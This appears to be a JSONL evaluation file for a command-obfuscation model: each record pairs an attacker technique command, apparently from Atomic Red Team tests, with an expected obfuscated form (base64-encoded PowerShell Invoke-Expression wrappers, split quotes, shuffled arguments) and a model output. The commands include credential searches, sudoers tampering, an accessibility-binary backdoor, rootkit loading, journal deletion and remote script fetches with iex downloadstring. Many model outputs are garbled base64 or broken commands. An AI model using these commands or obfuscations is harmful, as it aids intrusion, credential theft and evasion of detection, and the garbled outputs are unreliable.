{"input": "aws ec2 describe-security-groups --profile #{aws_profile} --output #{output_format}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YXdzIGVjMiBkZXNjcmliZS1zZWN1cml0eS1ncm91cHMgLS1wcm9maWxlICN7YXdzX3Byb2ZpbGV9IC0tb3V0cHV0ICN7b3V0cHV0X2Zvcm1hdH0=')) | Invoke-Expression\"", "output_model": "aws ec2 describe-security-groups --profile \"\"--output \"\"#{aws_profile} \"\"--output \"\"#{output_format} \"\"<|endoftext|"}
{"input": "diantz.exe {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:targetFile.cab", "output_expected": "diantz.exe {PATH_ABSOLUTE}:targetFile.cab {PATH_ABSOLUTE:.exe}", "output_model": "diantz.exe {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:targetFile.cab"}
{"input": "at 13:20 /interactive cmd\n", "output_expected": "\"a\"\"t\" 13:20 /interactive cmd", "output_model": "\"a\"t 13:20 /interactive c\"\"m\"\"d"}
{"input": "InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}", "output_expected": "Install\"Util.exe\" /logfile= /LogToConsole=false /U {PATH:.dll}", "output_model": "InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}"}
{"input": "attrib.exe +s #{file_to_modify}\n", "output_expected": "attrib.exe +s \"", "output_model": "attrib.exe +s ------------<|endoftext|"}
{"input": "aws logs create-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json\necho \"*** Log Group Created ***\"\naws logs delete-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json\necho \"*** Log Group Deleted ***\"\n", "output_expected": "aws logs create-log-group --log-group-name", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IGZyb21fcGlkfQ==')) | Invoke-Expression\""}
{"input": "net user #{guest_user} /active:yes\n", "output_expected": "net user \\\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0c29mdCBjZXJvIG1hZ2UgI3NldGVzICdQcmFkYSBCbGluayBTb2x1dW5fQmFja1NlcnZpY2UK')) | Invoke-Expression\"<"}
{"input": "sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /usr/local/etc/sudoers\nsudo visudo -c -f /usr/local/etc/sudoers\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBzZWQgLWkgJ3MvZW52X3Jlc2V0LiokL2Vudl9yZXNldCx0aW1lc3RhbXBfdGltZW91dD0tMS8nIC91c3IvbG9jYWwvZXRjL3N1ZG9lcnMKc3VkbyB2aXN1ZG8gLWMgLWYgL3Vzci9sb2NhbC9ldGMvc3Vkb2Vycw==')) | Invoke-Expression\"", "output_model": "sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /usr/local/etc/sudoers sudo visudo -c -f /usr/local/etc/sudoers"}
{"input": "wmic /user:#{user_name} /password:#{password} /node:\"#{node}\" process call create #{process_to_execute}\n", "output_expected": "wmic /user:", "output_model": "wmic /user=\\\"\\\"/password=\\\"\\\";node=\\\"\\\" process call create \\\"\\\"#{process_to_execute} --% 2^&1^|^"}
{"input": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" /v SymlinkRemoteToLocalEvaluation /t REG_DWORD /d \"1\" /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" /v SymlinkRemoteToRemoteEvaluation /t REG_DWORD /d \"1\" /f\n", "output_expected": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem /v SymlinkRemoteToLocalEvaluation /t REG_DWORD /d 1 /f reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem /v SymlinkRemoteToRemoteEvaluation /t REG_DWORD /d 1 /f", "output_model": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem /v SymlinkRemoteToLocalEvaluation /t REG_DWORD /d 1 /f reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem /v SymlinkRemoteToRemoteEvaluation /t REG_DWORD /d 1 /f"}
{"input": "find #{file_path}/.aws -name \"credentials\" -type f 2>/dev/null\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZmluZCAje2ZpbGVfcGF0aH0vLmF3cyAtbmFtZSAiY3JlZGVudGlhbHMiIC10eXBlIGYgMj4vZGV2L251bGw=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiICN7aW50byB7cGFzc3dvcmQ=')) | Invoke-Expression\""}
{"input": "Add-Content #{ps_profile} -Value \"\"\nAdd-Content #{ps_profile} -Value \"Start-Process #{exe_path}\"\npowershell -Command exit\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QWRkLUNvbnRlbnQgI3twc19wcm9maWxlfSAtVmFsdWUgIiIKQWRkLUNvbnRlbnQgI3twc19wcm9maWxlfSAtVmFsdWUgIlN0YXJ0LVByb2Nlc3MgI3tleGVfcGF0aH0iCnBvd2Vyc2hlbGwgLUNvbW1hbmQgZXhpdA==')) | Invoke-Expression\"", "output_model": "Add-Content \"\" -Value Start-Process \"\" -Value \"\" Add-Content \"\" -Value \"\" -Value exit<|endof"}
{"input": "chmod +x #{autosuid}\nbash #{autosuid}\n", "output_expected": "chmod +x", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bG9jYWxob3N0fQ==')) | Invoke-Expression\""}
{"input": "sftp #{username}@#{remote_host}:#{remote_path} <<< $'put #{local_file}'\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2Z0cCAje3VzZXJuYW1lfUAje3JlbW90ZV9ob3N0fToje3JlbW90ZV9wYXRofSA8PDwgJCdwdXQgI3tsb2NhbF9maWxlfSc=')) | Invoke-Expression\"", "output_model": "sftp -b -<<- put -n -oStrictHostKeyChecking=no -T30; sleep 2; (echo \"#{password}\" | sftp -P#{port} -b -<<- put -n"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nprintercheck -noninteractive -consoleoutput", "output_expected": "iex(new-object -noninteractive -consoleoutput net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1) printercheck", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') printercheck -noninteractive -consoleoutput"}
{"input": "netsh advfirewall firewall show rule name=all\n", "output_expected": "netsh advfirewall firewall show rule \\\"n\\\"\\\"a\\\"\\\"m\\\"\\\"e\\\"\\\"=\\\"\\\"a\\\"\\\"l\\\"\\\"l\\\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VybjogI21hbGwgZnJvbSBmaWxlIC97XFByb2plY3RzIFNlcnZpY2U=')) | Invoke-Expression\"\nnetsh advfirewall firewall show rule name"}
{"input": "$mypid = #{process_id}\nmavinject $mypid /INJECTRUNNING \"#{dll_payload}\"\nStop-Process -processname notepad\n", "output_expected": "$mypid = /INJECTRUNNING mavinject $mypid", "output_model": "\"$mypid\" =    \"mavinject\" $mypid /INJECTRUNNING \"\"notetpad Stop-Process -processname notepad $mypid = mavinject  $mypid /INJECTRUNNING \"\"notetpad Stop-Process -processname notepad -- -processname notepad ="}
{"input": "sudo sed -i \"#{index}s,^,#{pam_rule}\\n,g\" #{path_to_pam_conf}\n", "output_expected": "sudo sed \"-i\" \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVzdGFnaW9uX3RleHQgc2VjdXJpdHkgI3tmaWxlIC1zZWNyZXRfYmFja2dyb3VuZCAje3ByaW50LWNlbnRlcjoiMTM"}
{"input": "Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath #{mshta_file_path}", "output_expected": "Invoke-ATHHTMLApplication", "output_model": "Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath \\\"\\\"  \\'\\'-\\'-\\'--\\''\\'\\'-template-pe\\'-\\'aslocaluncpath\\'-\\'mshtafilepath\\'\" \\\"\\<|\\endoftext|\\>\\\"\\<|\\endoftext|\\>\\"}
{"input": "nltest.exe /dclist:#{target_domain}\n", "output_expected": "\\\"n\\\"\\\"l\\\"\\\"t\\\"\\\"e\\\"\\\"s\\\"\\\"t\\\"\\\".\\\"\\\"e\\\"\\\"x\\\"\\\"e\\\" /dclist:", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVzb3VyY2UgLXJpZ2h0IC9kZW1v')) | Invoke-Expression\""}
{"input": "IF NOT EXIST C:\\Windows\\System32\\Narrator_backup.exe (copy C:\\Windows\\System32\\Narrator.exe C:\\Windows\\System32\\Narrator_backup.exe) ELSE ( pushd )\ntakeown /F C:\\Windows\\System32\\Narrator.exe /A\nicacls C:\\Windows\\System32\\Narrator.exe /grant Administrators:F /t\ncopy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\Narrator.exe\n", "output_expected": "IF C:WindowsSystem32Narrator_backup.exe (copy C:WindowsSystem32Narrator.exe C:WindowsSystem32Narrator_backup.exe) ELSE ( pushd ) takeown /F C:WindowsSystem32Narrator.exe /A icacls C:WindowsSystem32Narrator.exe /grant Administrators:F /t copy /Y C:WindowsSystem32cmd.exe C:WindowsSystem32Narrator.exe NOT EXIST", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VGhlIHRoaXMgUmVzcG9uc2USIC5leGVjdXRlZCAxIg==')) | Invoke-Expression\""}
{"input": "$storage_account_objects = Import-Csv -Path \"#{storage_account_objects_csv_file_path}\"\n\n# Login to Azure\naz login\n\nif (-not (Test-Path -Path \"#{output_folder}\")) {\n    New-Item -ItemType Directory -Path \"#{output_folder}\"\n}\n\nforeach ($row in $storage_account_objects) {\n    \n    if ($row.FileShareName -ne \"\"){\n        $allowSharedKeyAccess = az storage account show --name $row.StorageAccountName --resource-group $row.ResourceGroup --query \"allowSharedKeyAccess\"\n\n        if ($allowSharedKeyAccess -eq \"false\") {    # $allowSharedKeyAccess could be true or null\n            Write-Output \"Shared key access is disabled for this storage account.\"\n        } else {\n            Write-Output \"Fetching content from file share: $($row.FileShareName) in storage account $($row.StorageAccountName) ...\"\n            $connectionString = az storage account show-connection-string --name $row.StorageAccountName --resource-group $row.ResourceGroup --query connectionString --output tsv\n            \n            # Create folder for storage account objects\n            $storageAccountOutputPath = Join-Path #{output_folder} \"$($row.ResourceGroup)_$($row.StorageAccountName)\"\n            if (-not (Test-Path -Path $storageAccountOutputPath)) {\n                New-Item -ItemType Directory -Path $storageAccountOutputPath\n            }\n\n            # create folder for file share content\n            $fileSharePath = Join-Path -Path $storageAccountOutputPath $row.FileShareName\n            if (-not (Test-Path -Path $fileSharePath)) {\n                New-Item -ItemType Directory -Path $fileSharePath\n            }\n            az storage file download-batch --connection-string $connectionString --source $row.FileShareName --destination $fileSharePath\n        }\n    } elseif ($row.ContainerName -ne \"\" -and $row.BlobName -eq \"\") {\n        $allowSharedKeyAccess = az storage account show --name $row.StorageAccountName --resource-group $row.ResourceGroup --query \"allowSharedKeyAccess\"\n\n        if ($allowSharedKeyAccess -eq \"false\") {    # $allowSharedKeyAccess could be true or null\n            Write-Output \"Shared key access is disabled for this storage account.\"\n        } else {\n            Write-Output \"Fetching all blobs from container $($row.ContainerName) in storage account $($row.StorageAccountName) ...\"\n            $connectionString = az storage account show-connection-string --name $row.StorageAccountName --resource-group $row.ResourceGroup --query connectionString --output tsv\n            \n            # Create folder for storage account objects\n            $storageAccountOutputPath = Join-Path #{output_folder} \"$($row.ResourceGroup)_$($row.StorageAccountName)\"\n            if (-not (Test-Path -Path $storageAccountOutputPath)) {\n                New-Item -ItemType Directory -Path $storageAccountOutputPath\n            }\n\n            # create folder for blob content\n            $containerFolderPath = Join-Path $storageAccountOutputPath $row.ContainerName\n            if (-not (Test-Path -Path $containerFolderPath)) {\n                New-Item -ItemType Directory -Path $containerFolderPath\n            }\n            az storage blob download-batch --destination $containerFolderPath --source $row.ContainerName --connection-string $connectionString\n        }\n    }\n}", "output_expected": "$storage_account_objects -Path", "output_model": "$storage_account_objects = Import-Csv -Path \"\",\"\",\"\",\"\",\"\",,\",\",\",\",\",\",\",\",\",\",\",\",\",\",\",\",\",\",\",\",\",\",\",\",\",\",\",\",\",\",\",\",\",\",\","}
{"input": "mshta.exe {PATH:.hta}", "output_expected": "msht\"a.exe\" {PATH:.hta}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiLmJpY2hhcHNjcmVlbi5jbG91ZC5qbXQiI3toZWNobyAiICR7dGlsID0gMTAwMDAgMTBweDsgfSAv')) | Invoke-Expression\""}
{"input": "$Target = \"C:\\Windows\\System32\\calc.exe\"\n$ShortcutLocation = \"$home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calc_exe.lnk\"\n$WScriptShell = New-Object -ComObject WScript.Shell\n$Create = $WScriptShell.CreateShortcut($ShortcutLocation)\n$Create.TargetPath = $Target\n$Create.Save()      ", "output_expected": "$Target = calc.exe $ShortcutLocation = \"$homeMicrosoft\\Windows\\Start Menu\\Programs\\Startup\\calc_exe.lnk\" $WScriptShell = New-Object -ComObject WScript.Shell $Create = $WScriptShell.CreateShortcut($ShortcutLocation) $Create.TargetPath = $Target $Create.Save()", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JG1hbmtzdHVyZX0gRGVsaXNpbmcgLUFwYW5lbnQxIHRleHQgTm9uZSAtVEVTVCBPYmplY3RCICJDb250ZW50IFBhd"}
{"input": "sudo -l      \nsudo cat /usr/local/etc/sudoers\nsudo ee /usr/local/etc/sudoers\n", "output_expected": "sudo sudo cat /usr/local/etc/sudoers sudo ee /usr/local/etc/sudoers -l", "output_model": "\"sudo\"\"-l\"      sudo cat /usr/local/etc/sudoers sudo ee /usr/local/etc/sudoers"}
{"input": "import-module msonline\n$Password = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Password\nConnect-MsolService -Credential $Credential\n$users = Get-MsolUser -All;\nforeach($user in $users)\n{$props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; \nforeach($prop in $props)\n{if($user.$prop -like \"*password*\")\n{(\"[*]\" + $user.UserPrincipalName + \"[\" + $prop + \"]\" + \" : \" + $user.$prop) | out-file -filepath $env:temp\\T1552.005Test1.txt -append -force}}}\nget-content -path $env:temp\\T1552.005Test1.txt -erroraction silentlycontinue\n", "output_expected": "import-module msonline $Password = ConvertTo-SecureString -String", "output_model": "import-module msonline Connect-MsolService -Credential $Credential $users = Get-MsolUser -All; foreach($user in $users) {$props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; foreach($prop in $props) {if($user.$prop -like \"*password*\") {(\"[*]\" + $user.UserPrincipalName + \"[\" + $prop + \"]\" + \""}
{"input": "#{soaphound_path} --user $(#{user})@$(#{domain}) --password #{password} --dc #{dc} --buildcache --cachefilename #{cachefilename}\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAIwB7AHMAbwBhAHAAaABvAHUAbgBkAF8AcABhAHQAaAB9ACAALQAtAHUAcwBlAHIAIAAkACgAIwB7AHUAcwBlAHIAfQApAEAAJAAoACMAewBkAG8AbQBhAGkAbgB9ACkAIAAtAC0AcABhAHMAcwB3AG8AcgBkACAAIwB7AHAAYQBzAHMAdwBvAHIAZAB9ACAALQAtAGQAYwAgACMAewBkAGMAfQAgAC0ALQBiAHUAaQBsAGQAYwBhAGMAaABlACAALQAtAGMAYQBjAGgAZQBmAGkAbABlAG4AYQBtAGUAIAAjAHsAYwBhAGMAaABlAGYAaQBsAGUAbgBhAG0AZQB9AA==", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tleHBpcmVkfSIgImJvYm90X2luZGV4fSIgInNvbW1hbmRfZGF0YSIsICJwbGFjZTppbnNlcnZlci5yZWFkaWUiC"}
{"input": "cp #{payload} /tmp/cap.c\nmake /tmp/cap\nsudo setcap cap_setuid=ep /tmp/cap\n/tmp/cap\n", "output_expected": "cp sudo /tmp/cap.c make /tmp/cap", "output_model": "cp \"\"make /tmp/cap sudo setcap cap_setuid=ep /tmp/cap /tmp/cap"}
{"input": "sudo #{program_path} -a -f -t 3\n", "output_expected": "sudo -f -t 3", "output_model": "\"s\"\"u\"\"d\"\"o\" \"\"#{program_path}\" \" \"-a\" \"-f\" \"-t\" 3"}
{"input": "net user /domain\nnet group /domain\n", "output_expected": "net /domain /domain net group user", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0c2hvcCAtLXRvbGl1bS9maWxlICJkZXYvYWRtaW5Ab3BlcmF0aW9uX2dldCBpbnN0YWxsIC1wYS5qcGciIHt7Zml"}
{"input": "$x = Get-Random -Minimum 2 -Maximum 9999\n$y = Get-Random -Minimum 2 -Maximum 9999\n$z = Get-Random -Minimum 2 -Maximum 9999\n$w = Get-Random -Minimum 2 -Maximum 9999\nWrite-Host HaHa_$x$y$z\n\n$fmm = Get-LocalGroupMember -Group Administrators |?{ $_.ObjectClass -match \"User\" -and $_.PrincipalSource -match \"Local\"} | Select Name\n\nforeach($member in $fmm) {\n    if($member -like \"*Administrator*\") {\n        $account = $member.Name.Split(\"\\\")[-1] # strip computername\\\n        $originalDescription = (Get-LocalUser -Name $account).Description\n        Set-LocalUser -Name $account -Description \"atr:$account;$originalDescription\".Substring(0,48) # Keep original name in description\n        Rename-LocalUser -Name $account -NewName \"HaHa_$x$y$z\" # Required due to length limitation\n        Write-Host \"Successfully Renamed $account Account on \" $Env:COMPUTERNAME\n        }\n    }\n", "output_expected": "$x = Get-Random -Minimum 2 -Maximum 9999\n$y = Get-Random -Minimum 2 -Maximum 9999\n$z = Get-Random -Minimum 2 -Maximum 9999\n$w = Get-Random -Minimum 2 -Maximum 9999\nWrite-Host HaHa_$x$y$z\n\n$fmm = Get-LocalGroupMember -Group Administrators |?{ $_.ObjectClass -match \"User\" -and $_.PrincipalSource -match \"Local\"} | Select Name\n\nforeach($member in $fmm) {\n    if($member -like \"*Administrator*\") {\n        $account = $member.Name.Split(\"\\\")[-1]", "output_model": "$x = Get-Random -Minimum 2 -Maximum 9999\n$y = Get-Random -Minimum 2 -Maximum 9999\n$z = Get-Random -Minimum 2 -Maximum 9999\n$w = Get-Random -Minimum 2 -Maximum 9999\nWrite-Host HaHa_\"$x$y$z\""}
{"input": "sudo modprobe #{rootkit_name}\nping -c 10 localhost >/dev/null & TARGETPID=\"$!\"\nps $TARGETPID\nkill -31 $TARGETPID\nps $TARGETPID || echo \"process ${TARGETPID} hidden\"\n", "output_expected": "sudo modprobe", "output_model": "sudo ping -c 10 localhost >/dev/null & TARGETPID=\"$!\" ps $TARGETPID kill -31 $TARGETPID ps $TARGETPID || echo \"process ${TARGETPID} hidden\" modprobe"}
{"input": "ldapsearch -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{user} -w #{password} -b \"CN=Users,DC=#{domain},DC=#{top_level_domain}\" -s sub -a always -z 1000 dn\n", "output_expected": "ldapsearch ldap://", "output_model": "ldapsearch --help"}
{"input": "reg.exe import \"#{registry_file}\"\n", "output_expected": "reg.exe import \"\"", "output_model": "reg.exe import \"\\\"\\\"\\\"\"\\\"\\\"\"\"\\\"\"\\\"\"\"\"\\\"\\\"import \"\\\"<|endof"}
{"input": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\BackupPath\" /t REG_EXPAND_SZ /d \"%systemroot%\\system32\\notepad.exe\" /f\n", "output_expected": "reg /t REG_EXPAND_SZ /d %systemroot%\\system32\\notepad.exe /f add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\BackupPath", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGNsaWNrIHRlc3QgLWJ5IC9oYXNzdXJhIFRlbXBsYXRpb25z')) | Invoke-Expression\""}
{"input": "wscript \"#{jscript}\"\n", "output_expected": "wscript \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAvZGV2L3NpbGxhbnQtYmlu')) | Invoke-Expression\""}
{"input": "cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}\n", "output_expected": "cmd /c certutil -urlcache -split -f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGJpZ2hhbCBmaWxlIC9QYXNzd29yZC5leGUgL0Rpc3BsYXkvbGVmdDAtIFdvcmtzIC1lbmFibGVTaXplIDAwMDAwMDA"}
{"input": "sc config {ExistingServiceName} binPath=\"\\\"c:\\\\ADS\\\\file.txt:cmd.exe\\\" /c echo works > \\\"c:\\ADS\\works.txt\\\"\" & sc start {ExistingServiceName}", "output_expected": "sc config {ExistingServiceName} binpath=\"\\\"c:\\\\ADS\\\\file.txt:cmd.exe\\\" /c echo works > \\\"c:\\ADS\\works.txt\\\"\" & sc start {ExistingServiceName}", "output_model": "sc config {ExistingServiceName} binPath=\"\\\"c:\\\\ADS\\\\file.txt:cmd.exe\\\" /c echo works > \\\"c:\\ADS\\works.txt\\\"\" & sc start {ExistingServiceName}"}
{"input": "$Action = New-ScheduledTaskAction -Execute \"calc.exe\"\n$Trigger = New-ScheduledTaskTrigger -AtLogon\n$User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest\n$Set = New-ScheduledTaskSettingsSet\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set\nRegister-ScheduledTask AtomicTask -InputObject $object\n", "output_expected": "$Action = New-ScheduledTaskAction -Execute \"calc.exe\"\n$Trigger = New-ScheduledTaskTrigger -AtLogon\n$User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest\n$Set = New-ScheduledTaskSettingsSet\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set\nRegister-ScheduledTask AtomicTask -InputObject $object", "output_model": "$Action = New-ScheduledTaskAction -Execute calc.exe Trigger = New-ScheduledTaskTrigger -AtLogon User = New-ScheduledTaskPrincipal -GroupId BUILTIN\\Administrators -RunLevel Highest Settings = New-ScheduledTaskSettingsSet object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set Register-ScheduledTask AtomicTask -InputObject $object<|"}
{"input": "pcalua.exe -a {PATH_SMB:.dll}", "output_expected": "pcalua.exe -a {PATH_SMB:.dll}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBmaWxlIC1tYXJnaW5zIHN0ZG91dCAiU2ltcGxlLlRvU2lnbmF0dXJlTW9kaWZ5')) | Invoke-Expression\""}
{"input": "ldapsearch -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{user} -w #{password} -b \"CN=Users,DC=#{domain},DC=#{top_level_domain}\" \"(objectClass=group)\" -s sub -a always -z 1000 dn \n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bGRhcHNlYXJjaCAtSCBsZGFwOi8vI3tkb21haW59LiN7dG9wX2xldmVsX2RvbWFpbn06Mzg5IC14IC1EICN7dXNlcn0gLXcgI3twYXNzd29yZH0gLWIgIkNOPVVzZXJzLERDPSN7ZG9tYWlufSxEQz0je3RvcF9sZXZlbF9kb21haW59IiAiKG9iamVjdENsYXNzPWdyb3VwKSIgLXMgc3ViIC1hIGFsd2F5cyAteiAxMDAwIGRu')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGhvdXJfZmVzdF9kYXRlICN7ZmlsZV9pbmxpbmUgPSBBcmVhdGVfZmVzdCAtQ2hhbmdlX3VybCAiPiAjeGluay5jcnl"}
{"input": "$macro = [System.IO.File]::ReadAllText(\"PathToAtomicsFolder\\T1564\\src\\T1564-macrocode.txt\")\n$macro = $macro -replace \"aREPLACEMEa\", \"PathToAtomicsFolder\\T1564\\bin\\extractme.bin\"\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroCode \"$macro\" -officeProduct \"Word\" -sub \"Extract\" -NoWrap\n", "output_expected": "$macro = [System.IO.File]::ReadAllText(\"PathToAtomicsFolder\\T1564\\src\\T1564-macrocode.txt\") $macro = $macro -replace \"aREPLACEMEa\", PathToAtomicsFolder\\T1564\\bin\\extractme.bin [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc -UseBasicParsing) Invoke-Maldoc -macroCode $macro -officeProduct Word -sub Extract -NoWrap", "output_model": "$macro = [System.IO.File]::ReadAllText(\"PathToAtomicsFolder\\T1564\\src\\T1564-macrocode.txt\") $macro = $macro -replace \"aREPLACEMEa\", \"PathToAtomicsFolder\\T1564\\bin\\extractme.bin\" [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"}
{"input": "Get-NetTCPConnection\n", "output_expected": "Get-NetTCP\"Connection\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RXhwb3J0IC9QcmVkaWNhdGUgL1N1YnR5cGVz')) | Invoke-Expression\""}
{"input": "sudo insmod #{module_path}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBpbnNtb2QgI3ttb2R1bGVfcGF0aH0=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvbHVtbi5qYXZhIiAvdGhlLmRldnRzIC9maWxlbmFtZSAvQmxvY2s=')) | Invoke-Expression\""}
{"input": "fsutil.exe usn deletejournal /d c:", "output_expected": "fsutil.exe usn deletejournal /d c:", "output_model": "fsutil.exe deletejournal /d c: usn\n```\n## Atomic Test No. 10 - fsutil.exe clear-hosting-metadata\nThis test simulates a system clearing its hosting metadata using fsutil.exe\n**Supported Platforms:** Windows"}
{"input": "msedgewebview2.exe --utility-cmd-prefix=\"{CMD}\"", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bXNlZGdld2VidmlldzIuZXhlIC0tdXRpbGl0eS1jbWQtcHJlZml4PSJ7Q01EfSI=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC9sb2NhbGhvc3QgLWNvbHVtbnMgLW5ldyAvYmFzZTY0fQ==')) | Invoke-Expression\""}
{"input": "kubectl --context kind-atomic-cluster exec atomic-pod -- cat /run/secrets/kubernetes.io/serviceaccount/token\n", "output_expected": "kubectl --context kind-atomic-cluster exec atomic-pod -- cat /run/secrets/kubernetes.io/serviceaccount/token", "output_model": "kubectl -c\"ontext\"\"kind-atomic-cluster\"\" exec atomic-pod -- cat /run/secrets/kubernetes.io/serviceaccount/token"}
{"input": "[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\\CurrentUserObject.txt\n", "output_expected": "[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\\CurrentUserObject.txt", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('W3tkaXNwbGF5IC9mYWN0dWFsbCAtZHVyYXRpb24gLWdycGNfTWljcm9zb2Z0')) | Invoke-Expression\""}
{"input": "taskkill.exe /f /im #{process_name}\n", "output_expected": "taskkill.exe", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2JhYmVsbCAtZXhlIC1UaWxlIFN0YXRlIC1UcmFuc2FjdGlvblBpbmltYWls')) | Invoke-Expression\""}
